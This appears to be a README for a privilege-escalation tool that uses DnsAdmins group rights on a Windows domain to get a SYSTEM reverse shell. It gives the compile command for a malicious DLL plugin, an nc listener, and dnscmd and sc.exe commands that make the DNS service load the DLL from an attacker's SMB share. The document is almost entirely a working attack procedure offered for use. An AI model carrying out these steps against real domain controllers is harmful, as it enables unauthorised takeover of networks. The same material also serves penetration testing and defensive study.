## Gain system reverse shell from domain user with Dnsadmin group
  
    
Reverse shell is practically copy-paste from `dev-frog/C-Reverse-Shell` (here on Github)  
The DNS api are greatly inspired by `vbscrub`  
  
# Compile & execute
*NB!:* Remember to edit the `DnsPlug.cpp` file to match IP and Port of attacker.
```bash
# x86_64-w64-mingw32-gcc -shared -o DnsPlug.dll DnsPlug.cpp -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
.. Setup NC listener
# nc -lnvp 443
.. go to Windows machine
PS > dnscmd.exe <target.ip> /config /serverlevelplugindll \\<your_smb>\<share_name>\DnsPlug.dll
PS > sc.exe \\<target.ip> stop dns
PS > sc.exe \\<target.ip> start dns
```
